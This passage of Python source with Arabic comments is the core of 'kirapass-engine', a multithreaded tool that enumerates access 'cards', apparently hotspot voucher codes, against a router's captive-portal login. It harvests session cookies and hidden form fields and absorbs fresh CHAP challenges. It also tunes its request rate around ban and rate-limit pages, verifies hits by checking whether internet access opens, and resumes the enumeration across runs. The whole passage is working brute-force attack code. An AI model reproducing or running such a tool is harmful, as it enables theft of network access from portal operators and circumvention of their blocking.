                "net_kinds": dict(self.net_kinds),  # مفتاح net_kinds في القاموس
                "hits": self.hits,  # مفتاح hits في القاموس
                "review": self.review[-40:],  # مفتاح review في القاموس
                "review_count": len(self.review),  # مفتاح review_count في القاموس
                "stop_reason": self.stop_reason,  # مفتاح stop_reason في القاموس
                "ban_evidence": self._last_ban_evidence,  # مفتاح ban_evidence في القاموس
                "progress": progress,  # مفتاح progress في القاموس
                "speed": round(self.speed, 2),  # مفتاح speed في القاموس
                "elapsed": round(elapsed, 1),  # مفتاح elapsed في القاموس
                "latency": {"avg_ms": round(sum(lat) / len(lat)) if lat else 0,  # مفتاح latency في القاموس
                            "p95_ms": lat[int(len(lat) * 0.95)] if lat else 0},  # مفتاح p95_ms في القاموس
                "throttle": {"delay_ms": self.throttle["delay_ms"],  # مفتاح throttle في القاموس
                             "base_ms": self.throttle["base_ms"],  # مفتاح base_ms في القاموس
                             "reason": self.throttle["reason"]},  # مفتاح reason في القاموس
                "calibration": self.calibration,  # مفتاح calibration في القاموس
                "internet_opened": self._internet_opened,  # مفتاح internet_opened في القاموس
                "diagnostics": self.diagnostics,  # مفتاح diagnostics في القاموس
                "verify_enabled": self.verify_enabled,  # مفتاح verify_enabled في القاموس
                "seq": self.seq,  # مفتاح seq في القاموس
            }  # إغلاق القوس المفتوح في السطر السابق

    def stop(self, reason: str = "user_stop") -> None:  # تعريف الدالة stop(self, reason) ترجع None
        if not self.stop_reason:  # شرط معكوس: ليس self.stop_reason
            self.stop_reason = reason  # إسناد reason إلى self.stop_reason
        self.stop_event.set()  # استدعاء self.stop_event.set

    def _wait(self, seconds: float) -> bool:  # تعريف الدالة _wait(self, seconds) ترجع bool
        # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
        """Sleep in small steps and wake up the moment the user stops the run.

        Returns False when the run was stopped while waiting.
        """  # نهاية النص متعدد الأسطر
        end = time.time() + max(0.0, float(seconds or 0))  # حساب جمع بين time.time() وmax(0.0, float(seconds أو 0)) وإسناده إلى end
        while time.time() < end:  # حلقة ما دام مقارنة
            if self.stop_event.wait(0.4):  # شرط: نتيجة self.stop_event.wait(0.4)
                return False  # إرجاع False
        return True  # إرجاع True

    def start(self, profile: dict, attempts: int, threads: int, delay_ms: int = 0,  # تعريف الدالة start(self, profile, attempts, threads, delay_ms, keyword, known_card, verify_after, auto_stop, resume, preflight_only) ترجع dict
              keyword: str = "", known_card: str = "", verify_after: bool = True,  # مفتاح keyword في القاموس
              auto_stop: bool = True, resume: bool = True,  # مفتاح auto_stop في القاموس
              preflight_only: bool = False) -> dict:  # مفتاح preflight_only في القاموس
        if self.state == "running":  # شرط: self.state يساوي 'running'
            return {"ok": False, "error": "already_running"}  # إرجاع قاموس
        p = store.migrate(profile)  # إسناد نتيجة استدعاء store.migrate (معامل واحد) إلى p
        if not resume:  # شرط معكوس: ليس resume
            # ابدأ الفضاء من أوله مجدداً — بمسار جديد، حتى تكون
            # دورة جديدة فعلاً لا نفس البطاقات بنفس الترتيب
            p.update({"space_pos": 0, "walk_a": 0, "walk_b": 0})  # استدعاء p.update (معامل واحد)
        problems = store.validate(p)  # إسناد نتيجة استدعاء store.validate (معامل واحد) إلى problems
        hard = [x for x in problems if x != "space_is_astronomically_big"]  # بناء اشتقاق قائمة وإسناده إلى hard
        if hard:  # شرط: hard
            return {"ok": False, "error": "profile_invalid", "problems": problems}  # إرجاع قاموس

        self.profile = p  # إسناد p إلى self.profile
        self.plan = {"attempts": int(attempts), "threads": int(threads),  # إسناد قاموس إلى self.plan
                     "delay_ms": int(delay_ms), "keyword": keyword,  # مفتاح delay_ms في القاموس
                     "known_card": bool(known_card),  # مفتاح known_card في القاموس
                     "known_card_preflight_only": bool(preflight_only),  # مفتاح known_card_preflight_only في القاموس
                     "verify": bool(verify_after), "resume": bool(resume),  # مفتاح verify في القاموس
                     "verification_serialized": False,  # مفتاح verification_serialized في القاموس
                     "effective_threads": int(threads)}  # مفتاح effective_threads في القاموس
        self.verify_enabled = bool(verify_after)  # إسناد نتيجة استدعاء bool (معامل واحد) إلى self.verify_enabled
        self.auto_stop = bool(auto_stop)  # إسناد نتيجة استدعاء bool (معامل واحد) إلى self.auto_stop
        self._verification_serialized = False  # إسناد القيمة الثابتة self._verification_serialized
        self.counters = Counter()  # إسناد نتيجة استدعاء Counter إلى self.counters
        self.net_kinds = Counter()  # إسناد نتيجة استدعاء Counter إلى self.net_kinds
        self.reason_counts = Counter()  # إسناد نتيجة استدعاء Counter إلى self.reason_counts
        self.hits, self.review = [], []  # إسناد مجموعة إلى مجموعة
        self.stop_reason, self.error = "", ""  # إسناد مجموعة إلى مجموعة
        # تشغيل جديد يبدأ بسيل أحداث نظيف، فلا تعرض الصفحة أبداً
        # نتائج التشغيل السابق
        with self.lock:  # سياق مُدار: self.lock
            self.events.clear()  # استدعاء self.events.clear
            self.seq = 0  # إسناد القيمة الثابتة self.seq
        self.latencies.clear()  # استدعاء self.latencies.clear
        self.throttle.update({"delay_ms": int(delay_ms), "base_ms": int(delay_ms),  # استدعاء self.throttle.update (معامل واحد)
                              "reason": "", "events": []})  # مفتاح reason في القاموس
        self._ban_count = self._rate_count = self._unknown_saved = 0  # إسناد القيمة الثابتة self._ban_count, self._rate_count, self._unknown_saved
        self._last_ban_evidence = None  # إسناد القيمة الثابتة self._last_ban_evidence
        self._transport_error_streak = 0  # إسناد القيمة الثابتة self._transport_error_streak
        self._recent.clear()  # استدعاء self._recent.clear
        self._since_check = []  # إسناد قائمة إلى self._since_check
        self._internet_opened = None  # إسناد القيمة الثابتة self._internet_opened
        self._unevaluated = 0       # بطاقات رفض الراوتر الحكم عليها
        self._retried = {}          # بطاقة ← كم مرة سألنا عنها مجدداً
        self._pending = []          # بطاقات تنتظر أن يُسأل عنها مجدداً
        self._retry_processed = 0   # محاولات إضافية، لا بطاقات جديدة مغطّاة
        self._pace = {"t": time.time(), "n": 0, "ok": 0, "bad": 0}  # إسناد قاموس إلى self._pace
        self._pool = None           # مجمّع خيوط قابل للنمو (انظر _add_workers)
        self._clean_streak = 0  # إسناد القيمة الثابتة self._clean_streak
        space = store.space_size(p)  # إسناد نتيجة استدعاء store.space_size (معامل واحد) إلى space
        pos = max(0, int(p.get("space_pos", 0)))  # إسناد نتيجة استدعاء max (2 معاملات) إلى pos
        self._run_start_pos = pos
        total = int(attempts)  # إسناد نتيجة استدعاء int (معامل واحد) إلى total
        if space:  # شرط: space
            remaining = space - (pos % space)  # حساب طرح بين space وباقي القسمة وإسناده إلى remaining
            total = min(total, remaining)  # إسناد نتيجة استدعاء min (2 معاملات) إلى total
        self.progress = {"attempts": 0, "queued": 0, "dropped": 0,  # إسناد قاموس إلى self.progress
                         "total": total, "covered": min(pos, space),  # مفتاح total في القاموس
                         "space": space, "percent": 0.0}  # مفتاح space في القاموس
        self.started_at, self.finished_at = time.time(), 0.0  # إسناد مجموعة إلى مجموعة
        self.stop_event.clear()  # استدعاء self.stop_event.clear
        self.state = "calibrating"  # إسناد القيمة الثابتة self.state
        self.emit("state", {"state": "calibrating"})  # استدعاء self.emit (2 معاملات)
        self.thread = threading.Thread(  # إسناد نتيجة استدعاء threading.Thread (target=…، args=…، daemon=…، name=…) إلى self.thread
            target=self._run, args=(p, int(attempts), int(threads), delay_ms,  # المعامل المسمّى target
                                    keyword, known_card, bool(preflight_only)),  # عنصر في القائمة/المعاملات (يتبعه المزيد)
            daemon=True, name="kirapass-engine")  # المعامل المسمّى daemon
        self.thread.start()  # استدعاء self.thread.start
        return {"ok": True}  # إرجاع قاموس

    # -- التشغيل ---------------------------------------------------------
    # جسم التشغيل: معايرة ← بناء الفضاء ← طابور ← خيوط ← تلخيص ← حفظ.
    # resume_pos يحسب ما غُطّي فعلاً ويخصم البطاقات بلا إجابة (_unevaluated + _pending)
    # حتى لا تُعتبر البطاقات المحجوبة «مجرَّبة» وتُفقد إلى الأبد.
    def _run(self, p, attempts, threads, delay_ms, keyword, known_card,  # تعريف الدالة _run(self, p, attempts, threads, delay_ms, keyword, known_card, preflight_only) ترجع None
             preflight_only=False) -> None:  # المعامل المسمّى preflight_only
        try:  # بدايةtry محمية (يليها except/finally)
            cal = calibrate(p, known_card=known_card, keyword=keyword,  # إسناد نتيجة استدعاء calibrate (معامل واحد، known_card=…، keyword=…، checks=…، probes=…، preflight_only=…) إلى cal
                            checks=self.checks,  # المعامل المسمّى checks
                            probes=config.CALIBRATION_PROBES,  # المعامل المسمّى probes
                            preflight_only=preflight_only)  # المعامل المسمّى preflight_only
            if not cal.ok and calibration_retryable(cal.error):  # شرط مركّب (و)
                # عثرة واحدة يجب ألا تكلّف المستخدم التشغيل كله
                self.emit("note", {"message": "retrying_learning",  # استدعاء self.emit (2 معاملات)
                                   "after": cal.error})  # مفتاح after في القاموس
                time.sleep(1.0)  # استدعاء time.sleep (معامل واحد)
                cal = calibrate(p, known_card=known_card, keyword=keyword,  # إسناد نتيجة استدعاء calibrate (معامل واحد، known_card=…، keyword=…، checks=…، probes=…، preflight_only=…) إلى cal
                                checks=self.checks,  # المعامل المسمّى checks
                                probes=config.CALIBRATION_PROBES,  # المعامل المسمّى probes
                                preflight_only=preflight_only)  # المعامل المسمّى preflight_only
            known_card_failure = False  # إسناد القيمة الثابتة known_card_failure
            if known_card:  # شرط: known_card
                shape_step = next((item for item in cal.steps  # إسناد نتيجة استدعاء next (2 معاملات) إلى shape_step
                                   if item.get("id") == "shape_tuned"), None)  # تكملة السطر السابق داخل القوس
                known_card_failure = bool(shape_step and not shape_step.get("ok"))  # إسناد نتيجة استدعاء bool (معامل واحد) إلى known_card_failure
                if known_card_failure and not cal.error:  # شرط مركّب (و)
                    cal.error = shape_step.get("reason") or "known_card_not_proven"  # دمج منطقي (أو) وإسناده إلى cal.error
            self.calibration = cal.as_dict()  # إسناد نتيجة استدعاء cal.as_dict إلى self.calibration
            self.emit("calibration", self.calibration)  # استدعاء self.emit (2 معاملات)
            if not cal.ok or known_card_failure:  # شرط مركّب (أو)
                self.state, self.error = "done", cal.error or "calibration_failed"  # إسناد مجموعة إلى مجموعة
                self.stop_reason = "calibration_failed"  # إسناد القيمة الثابتة self.stop_reason
                self.finished_at = time.time()  # إسناد نتيجة استدعاء time.time إلى self.finished_at
                self.emit("state", {"state": "done",  # استدعاء self.emit (2 معاملات)
                                    "stop_reason": self.stop_reason})  # مفتاح stop_reason في القاموس
                return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
            self.profile = cal.profile  # إسناد cal.profile إلى self.profile
            self._internet_before = cal.internet or {}  # دمج منطقي (أو) وإسناده إلى self._internet_before
            # التحقق من الاتصال مشترك على مستوى الراوتر/الجهاز:
            # بطاقة مقبولة واحدة قد تجعل كل جلسة متوازية تبدو
            # متصلة. سلسِل الإرسال من خط أساس WALLED حتى لا يُنسب
            # انتقال الإنترنت إلا إلى البطاقة المُرسلة لتوّها،
            # وامنع ضبط الوتيرة من إعادة التوازي.
            self._verification_serialized = bool(  # إسناد نتيجة استدعاء bool (معامل واحد) إلى self._verification_serialized
                self.verify_enabled and  # تكملة السطر السابق داخل القوس
                self._internet_before.get("state") == "WALLED")  # تكملة السطر السابق داخل القوس
            if self._verification_serialized:  # شرط: self._verification_serialized
                threads = 1  # إسناد القيمة الثابتة threads
                self.plan["verification_serialized"] = True  # إسناد القيمة الثابتة self.plan['verification_serialized]
                self.plan["effective_threads"] = 1  # إسناد القيمة الثابتة self.plan['effective_threads']
            else:  # مفتاح else في القاموس
                self.plan["effective_threads"] = int(threads)  # إسناد نتيجة استدعاء int (معامل واحد) إلى self.plan['effective_threads']
            judge = cal.judge  # إسناد cal.judge إلى judge
            self.state = "running"  # إسناد القيمة الثابتة self.state
            self.emit("state", {"state": "running"})  # استدعاء self.emit (2 معاملات)
            self._start_watchdog()  # استدعاء self._start_watchdog

            space = store.space_size(self.profile)  # إسناد نتيجة استدعاء store.space_size (معامل واحد) إلى space
            start_pos = int(self.profile.get("space_pos", 0))  # إسناد نتيجة استدعاء int (معامل واحد) إلى start_pos
            if self.profile.get("walk_a") in (0, None):  # شرط: self.profile.get('walk_a') ضمن مجموعة
                self.profile["walk_a"] = _coprime(space)  # إسناد نتيجة استدعاء _coprime (معامل واحد) إلى self.profile['walk_a']
                self.profile["walk_b"] = random.randrange(max(space, 1)) if space else 0  # إسناد random.randrange(max(space, 1)) إن space وإلا 0 إلى self.profile['walk_b']
            if start_pos:  # شرط: start_pos
                # أبلِغ عن تقدم مستأنف بدل البدء بصمت
                # في مكان ما من منتصف فضاء البطاقات.
                self.emit("resume", {"from": min(start_pos, space) if space  # استدعاء self.emit (2 معاملات)
                                             else start_pos,  # عنصر في القائمة/المعاملات (يتبعه المزيد)
                                     "space": space,  # مفتاح space في القاموس
                                     "pass": int(self.profile.get("space_pass", 0))})  # مفتاح pass في القاموس

            task_q = queue.Queue(maxsize=max(16, threads * 4))  # إسناد نتيجة استدعاء queue.Queue (maxsize=…) إلى task_q
            stop_holder = {"done": False}  # إسناد قاموس إلى stop_holder

            def worker():  # تعريف الدالة worker()
                sess = new_session(for_attack=True,  # إسناد نتيجة استدعاء new_session (for_attack=…، headers=…) إلى sess
                                   headers=browser_headers(self.profile,  # المعامل المسمّى headers
                                                           self.profile["login_url"]))  # تكملة السطر السابق داخل القوس
                # المتصفح يطلب الصفحة دائماً قبل أن يُرسل: خذ الكوكي
                # والحقول المخفية التي توزعها البوابة،
                # واطلبها مجدداً بين حين وآخر (الرموز تنتهي والجلسات تتحرك)
                live = warm_up(sess, self.profile)  # إسناد نتيجة استدعاء warm_up (2 معاملات) إلى live
                since = 0  # إسناد القيمة الثابتة since
                try:  # بدايةtry محمية (يليها except/finally)
                    while not self.stop_event.is_set():  # حلقة ما دام نفي/سالب
                        try:  # بدايةtry محمية (يليها except/finally)
                            item = task_q.get(timeout=0.2)  # إسناد نتيجة استدعاء task_q.get (timeout=…) إلى item
                        except queue.Empty:  # تكملة السطر السابق داخل القوس
                            if stop_holder["done"]:  # شرط: stop_holder['done']
                                return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
                            continue  # الانتقال إلى الدورة التالية
                        try:  # بدايةtry محمية (يليها except/finally)
                            if item is None:  # شرط: item هو نفسه None
                                return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
                            if len(item) > 2 and item[2]:  # شرط مركّب (و)
                                with self.lock:  # سياق مُدار: self.lock
                                    self._retry_processed += 1  # تحديث self._retry_processed بعملية جمع
                            if live is None:  # شرط: live هو نفسه None
                                # لا صفحة لدينا وبالتالي لا جلسة:
                                # حاول مرة أخرى قبل إنفاق بطاقة على
                                # طلب سترفضه البوابة
                                live = warm_up(sess, self.profile) or live  # دمج منطقي (أو) وإسناده إلى live
                            if live is None:  # شرط: live هو نفسه None
                                with self.lock:  # سياق مُدار: self.lock
                                    self.net_kinds["no_session"] += 1  # تحديث self.net_kinds['no_session'] بعملية جمع
                                self._record_transport_health("no_session")  # استدعاء self._record_transport_health (معامل واحد)
                                if not self._retry_later(item[0], item[1]):  # شرط معكوس: ليس self._retry_later(item[0], item[1])
                                    with self.lock:  # سياق مُدار: self.lock
                                        self._unevaluated += 1  # تحديث self._unevaluated بعملية جمع
                                self._emit_net_error("no_session", item[0],  # استدعاء self._emit_net_error (3 معاملات)
                                                     None)  # تكملة السطر السابق داخل القوس
                                self._apply_delay_pressure("no_session")  # استدعاء self._apply_delay_pressure (معامل واحد)
                                self._check_stop_rules()  # استدعاء self._check_stop_rules
                                continue  # الانتقال إلى الدورة التالية
                            if (config.WARMUP_EVERY > 0 and  # شرط مركّب (و)
                                    since >= config.WARMUP_EVERY):  # تكملة تعريف متعدد الأسطر
                                # تجديد يفشل يُبقي الصفحة التي لدينا
                                live = warm_up(sess, live) or live  # دمج منطقي (أو) وإسناده إلى live
                                since = 0  # إسناد القيمة الثابتة since
                            since += 1  # تحديث since بعملية جمع
                            self._attempt(sess, judge, item[0], item[1], live)  # استدعاء self._attempt (5 معاملات)
                        # تكملة السطر السابق داخل القوس
                        except Exception as exc:      # noqa: BLE001
                            import traceback  # استيراد الوحدة traceback من المكتبة
                            with self.lock:  # سياق مُدار: self.lock
                                self.counters["INTERNAL_ERROR"] += 1  # تحديث self.counters['INTERNAL_ERROR'] بعملية جمع
                            # البطاقة لم يُحكم عليها إطلاقاً (عثرة في كودنا
                            # أو مقبس أسقطه الراوتر ليس
                            # إجابة): اسأل مجدداً، وإن لم نستطع فاتركها
                            # «غير مُختبَرة» — تشغيل كامل يجب ألا ينتهي
                            # دون أن يسأل فعلاً عن البطاقة
                            # الوحيدة التي تعمل
                            if not self._retry_later(item[0], item[1]):  # شرط معكوس: ليس self._retry_later(item[0], item[1])
                                with self.lock:  # سياق مُدار: self.lock
                                    self._unevaluated += 1  # تحديث self._unevaluated بعملية جمع
                            self.emit("internal", {  # استدعاء self.emit (2 معاملات)
                                "message": f"{type(exc).__name__}: {exc}",  # مفتاح message في القاموس
                                "trace": traceback.format_exc()[-600:],  # مفتاح trace في القاموس
                                "card": item[0] if item else ""})  # مفتاح card في القاموس
                        finally:  # مفتاح finally في القاموس
                            task_q.task_done()  # استدعاء task_q.task_done
                finally:  # مفتاح finally في القاموس
                    sess.close()  # استدعاء sess.close

            workers = [threading.Thread(target=worker, daemon=True,  # بناء اشتقاق قائمة وإسناده إلى workers
                                        name=f"kirapass-w{i}")  # المعامل المسمّى name
                       for i in range(threads)]  # تكملة السطر السابق داخل القوس
            for w in workers:  # دورة على workers باسم w
                w.start()  # استدعاء w.start
            # يُحتفظ بها حتى يستطيع ضابط الوتيرة إضافة أيدٍ عندما يكون الراوتر راضياً
            self._pool = {"q": task_q, "stop": stop_holder,  # إسناد قاموس إلى self._pool
                          "worker": worker, "threads": list(workers),  # مفتاح worker في القاموس
                          "started": int(threads)}  # مفتاح started في القاموس

            sent = 0  # إسناد القيمة الثابتة sent
            pos = start_pos  # إسناد start_pos إلى pos
            # total هو عدد البطاقات المميزة المتبقية في دورة المسار
            # هذه، لا طلب المستخدم الأكبر، ولا يشمل أبداً التفافاً إلى
            # بطاقات غُطّيت سابقاً في الدورة.
            planned = min(int(attempts), int(self.progress.get("total") or 0))  # إسناد نتيجة استدعاء min (2 معاملات) إلى planned
            try:  # بدايةtry محمية (يليها except/finally)
                while sent < planned and not self.stop_event.is_set():  # حلقة ما دام مقارنة و نفي/سالب
                    card = store.card_at_walk_pos(self.profile, pos)  # إسناد نتيجة استدعاء store.card_at_walk_pos (2 معاملات) إلى card
                    # put محدود بزمن: تشغيل متوقف يجب ألا يعلّق هنا أبداً
                    while not self.stop_event.is_set():  # حلقة ما دام نفي/سالب
                        try:  # بدايةtry محمية (يليها except/finally)
                            task_q.put((card, sent + 1, False), timeout=0.2)  # استدعاء task_q.put (معامل واحد، timeout=…)
                            break  # قطع الحلقة فوراً
                        except queue.Full:  # تكملة السطر السابق داخل القوس
                            continue  # الانتقال إلى الدورة التالية
                    else:  # مفتاح else في القاموس
                        break  # قطع الحلقة فوراً
                    pos += 1  # تحديث pos بعملية جمع
                    sent += 1  # تحديث sent بعملية جمع
                    with self.lock:  # سياق مُدار: self.lock
                        self.progress["queued"] = sent  # إسناد sent إلى self.progress['queued']
                        self.progress["percent"] = round(min(  # إسناد نتيجة استدعاء round (2 معاملات) إلى self.progress['percent']
                            100.0, sent / max(self.progress["total"], 1) * 100), 1)  # تكملة السطر السابق داخل القوس
                    if space and pos - start_pos >= space:  # شرط مركّب (و)
                        break  # قطع الحلقة فوراً
            except KeyboardInterrupt:  # تكملة السطر السابق داخل القوس
                self.stop("user_stop")  # استدعاء self.stop (معامل واحد)
            finally:  # مفتاح finally في القاموس
                # بطاقات لم تصلها إجابة تعود إلى الطابور أولاً:
                # هي التي نعرف عنها أقل شيء
                self._finish_retries(task_q)  # استدعاء self._finish_retries (معامل واحد)
                # دع العمال يُنهون ما هو في الطابور، حتى لا تُحسب بطاقة
                # «مُختبَرة» دون أن تُختبر
                if not self.stop_event.is_set():  # شرط معكوس: ليس self.stop_event.is_set()
                    deadline = time.time() + 30  # حساب جمع بين time.time() و30 وإسناده إلى deadline
                    while time.time() < deadline:  # حلقة ما دام مقارنة
                        if not getattr(task_q, "unfinished_tasks", 0):  # شرط معكوس: ليس getattr(task_q, 'unfinished_tasks', 0)
                            break  # قطع الحلقة فوراً
                        time.sleep(0.02)  # استدعاء time.sleep (معامل واحد)
                dropped = 0  # إسناد القيمة الثابتة dropped
                while True:  # حلقة ما دام True
                    try:  # بدايةtry محمية (يليها except/finally)
                        task_q.get_nowait()  # استدعاء task_q.get_nowait
                    except queue.Empty:  # تكملة السطر السابق داخل القوس
                        break  # قطع الحلقة فوراً
                    else:  # مفتاح else في القاموس
                        dropped += 1  # تحديث dropped بعملية جمع
                        task_q.task_done()  # استدعاء task_q.task_done
                stop_holder["done"] = True  # إسناد القيمة الثابتة stop_holder['done']
                self.stop_event.set()  # استدعاء self.stop_event.set
                if dropped:  # شرط: dropped
                    with self.lock:  # سياق مُدار: self.lock
                        # حساب جمع بين self.progress.get('dropped', 0) وdropped وإسناده إلى self.progress['dropped']
                        self.progress["dropped"] = \
                            self.progress.get("dropped", 0) + dropped  # تكملة السطر السابق داخل القوس
                for w in list((self._pool or {"threads": workers})["threads"]):  # دورة على list(self._pool أو قاموس['threads']) باسم w
                    w.join(timeout=5.0)  # استدعاء w.join (timeout=…)

            # تذكّر كم وصلنا، حتى يُكمل التشغيل التالي بدل
            # أن يبدأ من جديد. تُحسب فقط البطاقات التي وصلتها إجابة فعلاً:
            # كل ما كان ما يزال في الطابور عند التوقف يُعاد
            # في المرة القادمة (حسابه كـ«منتهٍ» سيتخطاه للأبد).
            with self.lock:  # سياق مُدار: self.lock
                # محاولات الإعادة طلبات حقيقية وتبقى في العدّادات
                # المرئية، لكنها ليست بطاقات إضافية مغطّاة.
                processed = (sum(self.counters.values()) -  # حساب طرح بين sum(self.counters.values()) وself._retry_processed وإسناده إلى processed
                             self._retry_processed)  # تكملة السطر السابق داخل القوس
                # بطاقة قابلها الراوتر بصفحة حجب أو صفحة تقييد
                # أو بلا إجابة إطلاقاً لم يُحكم عليها، فهي ليست «منتهية».
                refused = self._unevaluated + len(self._pending)  # حساب جمع بين self._unevaluated وlen(self._pending) وإسناده إلى refused
            resume_pos = max(start_pos,  # إسناد نتيجة استدعاء max (2 معاملات) إلى resume_pos
                             start_pos + processed - refused)  # تكملة السطر السابق داخل القوس
            if space:  # شرط: space
                passes, offset = divmod(resume_pos, space)  # إسناد نتيجة استدعاء divmod (2 معاملات) إلى مجموعة
                self.profile["space_pos"] = offset  # إسناد offset إلى self.profile['space_pos']
                if passes:  # شرط: passes
                    self.profile["space_pass"] = int(  # حساب جمع بين int(self.profile.get('space_pass', 0)) وpasses وإسناده إلى self.profile['space_pass']
                        self.profile.get("space_pass", 0)) + passes  # تكملة السطر السابق داخل القوس
                    # دورة جديدة على نفس الفضاء: امشِ فيها بترتيب جديد
                    self.profile["walk_a"] = _coprime(space)  # إسناد نتيجة استدعاء _coprime (معامل واحد) إلى self.profile['walk_a']
                    self.profile["walk_b"] = random.randrange(space)  # إسناد نتيجة استدعاء random.randrange (معامل واحد) إلى self.profile['walk_b']
            else:  # مفتاح else في القاموس
                self.profile["space_pos"] = resume_pos  # إسناد resume_pos إلى self.profile['space_pos']
            if self.persist:  # شرط: self.persist
                self.store.put(self.profile)  # استدعاء self.store.put (معامل واحد)

            with self.lock:  # سياق مُدار: self.lock
                # إسناد min(resume_pos, space) إن space وإلا resume_pos إلى self.progress['covered']
                self.progress["covered"] = min(resume_pos, space) if space \
                    else resume_pos  # تكملة السطر السابق داخل القوس
            if not self.stop_reason:  # شرط معكوس: ليس self.stop_reason
                self.stop_reason = "attempts_done"  # إسناد القيمة الثابتة self.stop_reason
            self.state = "done"  # إسناد القيمة الثابتة self.state
            self.finished_at = time.time()  # إسناد نتيجة استدعاء time.time إلى self.finished_at
            self._save_report()  # استدعاء self._save_report
            self.emit("state", {"state": "done",  # استدعاء self.emit (2 معاملات)
                                "stop_reason": self.stop_reason})  # مفتاح stop_reason في القاموس
        # تكملة السطر السابق داخل القوس
        except Exception as exc:                          # noqa: BLE001
            import traceback  # استيراد الوحدة traceback من المكتبة
            self.error = f"{type(exc).__name__}: {exc}"  # بناء نص منسّق وإسناده إلى self.error
            self.state = "done"  # إسناد القيمة الثابتة self.state
            self.finished_at = time.time()  # إسناد نتيجة استدعاء time.time إلى self.finished_at
            self.stop_reason = "engine_error"  # إسناد القيمة الثابتة self.stop_reason
            self.emit("error", {"message": self.error,  # استدعاء self.emit (2 معاملات)
                                "trace": traceback.format_exc()[-800:]})  # مفتاح trace في القاموس
            self.emit("state", {"state": "done", "stop_reason": self.stop_reason})  # استدعاء self.emit (2 معاملات)

    def _record_transport_health(self, failure: str = "") -> None:  # تعريف الدالة _record_transport_health(self, failure) ترجع None
        # بداية نص متعدد الأسطر — الأسطر التالية نصّ حرفي لا كود، فلا يقبل تعليقاً
        """Stop after a short burst of transport failures; never reconnect.

        A run of connect timeouts/no-session results may indicate a link outage
        or an administrator-enforced block. The tool cannot distinguish those
        causes safely, so it stops and leaves diagnosis to the network admin.
        """  # نهاية النص متعدد الأسطر
        with self.lock:  # سياق مُدار: self.lock
            if failure:  # شرط: failure
                self._transport_error_streak += 1  # تحديث self._transport_error_streak بعملية جمع
            else:  # مفتاح else في القاموس
                self._transport_error_streak = 0  # إسناد القيمة الثابتة self._transport_error_streak
            stop_now = (self._transport_error_streak >=  # مقارنة (أكبر أو يساوي) وإسناد النتيجة المنطقية إلى stop_now
                        config.CONSECUTIVE_TRANSPORT_FAILURE_LIMIT)  # تكملة السطر السابق داخل القوس
        if stop_now:  # شرط: stop_now
            self.stop("target_unreachable")  # استدعاء self.stop (معامل واحد)

    # -- محاولة واحدة -----------------------------------------------------
    # محاولة واحدة: إحماء ← بناء الحقول ← إرسال ← حكم ← تسجيل.
    # ابتلاع النموذج يحدّث قاموس العامل نفسه لا البروفايل العام (سباق خيوط).
    def _attempt(self, sess, judge, card: str, sent_index: int,  # تعريف الدالة _attempt(self, sess, judge, card, sent_index, profile) ترجع None
                 profile: dict = None) -> None:  # مفتاح profile في القاموس
        if self.stop_event.is_set():  # شرط: نتيجة self.stop_event.is_set()
            return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)
        p = profile or self.profile  # دمج منطقي (أو) وإسناده إلى p
        sess.read_timeout = config.ATTACK_READ_TIMEOUT  # إسناد config.ATTACK_READ_TIMEOUT إلى sess.read_timeout
        delay = self.throttle["delay_ms"] / 1000.0  # حساب قسمة بين self.throttle['delay_ms'] و1000.0 وإسناده إلى delay
        if delay > 0:  # شرط: delay أكبر من 0
            time.sleep(delay)  # استدعاء time.sleep (معامل واحد)
        started = time.time()  # إسناد نتيجة استدعاء time.time إلى started
        resp = None  # إسناد القيمة الثابتة resp
        last_err = None  # إسناد القيمة الثابتة last_err
        for attempt in range(3):        # أعد فقط عثرات النقل الحقيقية
            try:  # بدايةtry محمية (يليها except/finally)
                resp = send_login(sess, p, card)  # إسناد نتيجة استدعاء send_login (3 معاملات) إلى resp
                break  # قطع الحلقة فوراً
            # تكملة السطر السابق داخل القوس
            except Exception as exc:                      # noqa: BLE001
                err = classify(exc, p.get("login_url", ""))  # إسناد نتيجة استدعاء classify (2 معاملات) إلى err
                last_err = err  # إسناد err إلى last_err
                if err.retryable and attempt < 2:  # شرط مركّب (و)
                    time.sleep(0.06 * (attempt + 1))  # استدعاء time.sleep (معامل واحد)
                    continue  # الانتقال إلى الدورة التالية
                break  # قطع الحلقة فوراً

        if resp is None:  # شرط: resp هو نفسه None
            kind = last_err.kind if last_err else "unknown"  # إسناد last_err.kind إن last_err وإلا 'unknown' إلى kind
            self._record_transport_health(kind)  # استدعاء self._record_transport_health (معامل واحد)
            with self.lock:  # سياق مُدار: self.lock
                self.net_kinds[kind] += 1  # تحديث self.net_kinds[kind] بعملية جمع
            # لا إجابة إطلاقاً: اسأل مجدداً قبل تسمية هذه البطاقة مُختبَرة
            if not self._retry_later(card, sent_index):  # شرط معكوس: ليس self._retry_later(card, sent_index)
                with self.lock:  # سياق مُدار: self.lock
                    self._unevaluated += 1  # تحديث self._unevaluated بعملية جمع
            self._emit_net_error(kind, card, last_err)  # استدعاء self._emit_net_error (3 معاملات)
            self._apply_delay_pressure(kind)  # استدعاء self._apply_delay_pressure (معامل واحد)
            self._check_stop_rules()  # استدعاء self._check_stop_rules
            return  # إنهاء الدالة بلا قيمة (ترجع None ضمناً)

        self._record_transport_health()  # استدعاء self._record_transport_health
        elapsed_ms = (time.time() - started) * 1000  # حساب ضرب بين طرح و1000 وإسناده إلى elapsed_ms
        verdict = judge.classify(resp, submitted_values(p, card))  # إسناد نتيجة استدعاء judge.classify (2 معاملات) إلى verdict
        if profile is not None and (resp.text or "").strip():  # شرط مركّب (و)
            # نموذج الدخول الراجع هو ما سيعرضه المتصفح تالياً. قد
            # يحمل رمزاً أحادي الاستخدام أو action أو تحدي CHAP جديداً. حدّث
            # شكل الطلب الخاص بهذا العامل في مكانه لبطاقته التالية.
            fresh = absorb_form(p, resp.text, resp.url or p["login_url"])  # إسناد نتيجة استدعاء absorb_form (3 معاملات) إلى fresh
            if fresh is not p:  # شرط: fresh ليس نفسه p
                profile.clear()  # استدعاء profile.clear
                profile.update(fresh)  # استدعاء profile.update (معامل واحد)
                p = profile  # إسناد profile إلى p
        if verdict.is_hit and self.verify_enabled:  # شرط مركّب (و)
            verdict = self._verify_hit(sess, verdict, card)  # إسناد نتيجة استدعاء self._verify_hit (3 معاملات) إلى verdict

        with self.lock:  # سياق مُدار: self.lock
